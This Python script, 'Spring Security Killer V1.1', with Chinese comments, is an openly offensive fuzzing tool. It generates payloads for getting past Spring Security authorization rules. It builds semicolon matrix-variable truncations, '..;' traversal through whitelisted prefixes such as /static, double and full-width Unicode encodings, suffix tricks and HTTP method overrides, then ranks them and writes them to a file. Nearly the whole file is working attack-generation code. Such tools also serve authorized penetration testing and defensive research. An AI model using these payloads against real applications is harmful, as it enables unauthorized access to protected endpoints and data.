#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
--------------------------------------------------------------------------------------
 Tool Name   : Spring Security Killer V1.1 (Global Insight Edition)
 Author      : 七萬-QiWan777
 Date        : 2025-11-23
 Description : The most comprehensive Spring Security Fuzz Generator utilizing
               global security research (Orange Tsai, BlackHat, DEFCON).
 New Vectors :
   [+] Prefix Injection (Bypass /public/** rules)
   [+] Unicode normalization (%ef%bc%8f -> /)
   [+] Spring Cloud Gateway specifics
   [+] PathPatternParser vs AntPathMatcher
--------------------------------------------------------------------------------------
"""

import os
import sys
import datetime


# ===========================
# UI Configuration
# ===========================
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class Logger:
    @staticmethod
    def info(msg): print(f"{Colors.BLUE}[INFO]{Colors.ENDC} {msg}")

    @staticmethod
    def success(msg): print(f"{Colors.GREEN}[SUCCESS]{Colors.ENDC} {msg}")

    @staticmethod
    def warn(msg): print(f"{Colors.WARNING}[WARN]{Colors.ENDC} {msg}")


# ===========================
# The Ultimate Engine
# ===========================
class GlobalKillerEngine:
    def __init__(self):
        # 存储 (payload, weight, category)
        self.payloads = []
        self.seen = set()

        # 定义常见白名单前缀 (用于前缀注入)
        self.common_whitelists = [
            '/static', '/public', '/resources', '/assets',
            '/images', '/css', '/js', '/error', '/favicon.ico'
        ]

    def add(self, payload, weight, tag="General"):
        """添加并去重"""
        if payload not in self.seen:
            self.seen.add(payload)
            self.payloads.append({'p': payload, 'w': weight, 't': tag})

    def generate(self, base_path):
        """主生成逻辑"""
        path = "/" + base_path.strip().lstrip("/")
        if "?" in path: path = path.split("?")[0]

        # 1. 核心层: 矩阵变量 (Matrix Variables) [Weight: 10]
        # ---------------------------------------------------
        self._layer_matrix(path)

        # 2. 核心层: 路径归一化 (Normalization) [Weight: 9]
        # ---------------------------------------------------
        self._layer_normalization(path)

        # 3. 进阶层: 白名单前缀注入 (Prefix Injection) [Weight: 8]
        # *NEW in v5.0* - 针对 /public/** permitAll 的绕过
        # ---------------------------------------------------
        self._layer_prefix_injection(path)

        # 4. 进阶层: 后缀混淆 (Suffix Confusion) [Weight: 7]
        # ---------------------------------------------------
        self._layer_suffix_confusion(path)

        # 5. 专家层: Unicode 与编码差异 (Encoding) [Weight: 6]
        # *NEW in v5.0* - 针对 WAF 和 Tomcat 解析差异
        # ---------------------------------------------------
        self._layer_advanced_encoding(path)

        # 6. 专家层: 协议与方法覆盖 (Protocol) [Weight: 5]
        # ---------------------------------------------------
        self._layer_protocol_confusion(path)

    def _layer_matrix(self, path):
        """利用 ; 截断。这是 Spring 最频繁的漏洞点"""
        parts = path.strip('/').split('/')

        # 逐级插入
        current = ""
        for i, part in enumerate(parts):
            current += "/" + part
            remaining = "/" + "/".join(parts[i + 1:]) if i < len(parts) - 1 else ""

            self.add(current + ";" + remaining, 10, "Matrix")
            self.add(current + ";/" + remaining, 10, "Matrix")
            # 伪造参数
            self.add(current + ";jsessionid=x" + remaining, 10, "Matrix")
            self.add(current + ";name=test" + remaining, 9, "Matrix")

        # 尾部
        self.add(path + ";", 10, "Matrix")
        self.add(path + ";.css", 9, "Matrix")

    def _layer_normalization(self, path):
        """利用 / 和 . 的解析差异"""
        # Nginx 往往合并 //, Spring 可能不合并
        self.add(path.replace('/', '//'), 9, "Norm")
        self.add('//' + path.lstrip('/'), 9, "Norm")
        self.add(path + "/", 8, "Norm")

        # /./ 混淆
        self.add(path.replace('/', '/./'), 9, "Norm")

        # 跨目录回溯 (Path Traversal)
        # Nginx 看到 /foo/.. 认为抵消了, Spring 看到 ..;/ 认为是个路径段
        self.add(f"/;{path}", 9, "Norm")
        self.add(f"/foo/..;{path}", 9, "Norm")

    def _layer_prefix_injection(self, path):
        """
        [Global Insight] 很多系统允许 /static/**
        Payload: /static/..;/admin/users
        """
        for whitelist in self.common_whitelists:
            # 构造: /whitelist/..;/target
            payload = f"{whitelist}/..;{path}"
            self.add(payload, 8, "Prefix-Inject")

            # 构造: /whitelist/../target (标准 Nginx 绕过)
            payload_nginx = f"{whitelist}/..{path}"
            self.add(payload_nginx, 7, "Prefix-Inject")

    def _layer_suffix_confusion(self, path):
        """后缀伪造"""
        exts = ['.json', '.html', '.css', '.js', '.png']
        for ext in exts:
            self.add(path + ext, 7, "Suffix")
            self.add(path + ";" + ext, 8, "Suffix")  # 结合分号
            self.add(path + "/" + ext, 6, "Suffix")  # /user/.json

    def _layer_advanced_encoding(self, path):
        """
        [Global Insight] 全角字符与 Unicode
        Tomcat/Spring 在某些配置下会归一化全角字符
        """
        # 1. 双重编码
        self.add(path.replace('/', '%252f'), 6, "Encode")

        # 2. Unicode 全角斜杠 (Full-width Solidus: ／ -> %ef%bc%8f)
        # 某些 WAF 不认识这个字符，但后端 Java 会把它变成 /
        path_unicode = path.replace('/', '%ef%bc%8f')
        self.add(path_unicode, 6, "Unicode")

        # 3. URL Encoded Dot
        self.add(path.replace('.', '%2e'), 6, "Encode")

    def _layer_protocol_confusion(self, path):
        """方法覆盖与参数污染"""
        # HiddenHttpMethodFilter
        self.add(path + "?_method=POST", 5, "Method")
        self.add(path + "?_method=DELETE", 5, "Method")

        # 尾部 ? 绕过 (Spring Cloud Gateway)
        self.add(path + "?", 5, "Gateway")
        self.add(path + "#", 5, "Gateway")

    def get_results(self):
        # 按权重排序 (Weight Descending)
        return sorted(self.payloads, key=lambda x: x['w'], reverse=True)


# ===========================
# Auto-Discovery
# ===========================
def auto_detect_file():
    cwd = os.getcwd()
    files = [f for f in os.listdir(cwd) if
             os.path.isfile(f) and f.endswith('.txt') and not f.startswith('fuzz_bypass_')]
    if not files:
        Logger.warn("No target .txt files found.")
        sys.exit(1)
    return files[0]  # Default to first found


# ===========================
# Main
# ===========================
def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{Colors.BOLD}{Colors.HEADER}")
    print(r"""
   _________            _               ____  __      _______   
  /   _____/___________|__| ____   ____|    |/ _|____ \   _  \  
  \_____  \\____ \_  __ \  |/    \/ ___|      < /  _ \/  /_\  \ 
  /        \  |_> >  | \/  |   |  \___ \    |  (  <_> )  \_/   \
 /_______  /   __/|__|  |__|___|  /____>____|__ \____/\_____  /
         \/|__|                 \/             \/           \/  
    Spring Security Killer V1.1 [Global Insight Edition]
    Author: 七萬-QiWan777
    """)
    print(f"{Colors.ENDC}")

    target_file = auto_detect_file()
    Logger.info(f"Target File: {target_file}")

    try:
        with open(target_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
    except:
        sys.exit(1)

    engine = GlobalKillerEngine()

    print(f"{Colors.CYAN}[*] Applying Global Research Patterns...{Colors.ENDC}")
    for t in targets:
        engine.generate(t)

    results = engine.get_results()

    # Output
    now = datetime.datetime.now()
    filename = f"fuzz_bypass_{now.strftime('%Y%m%d_%H%M')}.txt"

    with open(filename, 'w') as f:
        for item in results:
            f.write(f"{item['p']}\n")

    Logger.success(f"Generated {len(results)} Advanced Payloads.")
    Logger.success(f"File: {os.path.abspath(filename)}")

    # 打印前10个高危 Payload 示例
    print("\n[+] Top 10 High-Probability Payloads Preview:")
    for i, item in enumerate(results[:10]):
        print(f"    {item['w']} | {item['t'].ljust(13)} | {item['p']}")


if __name__ == "__main__":
    main()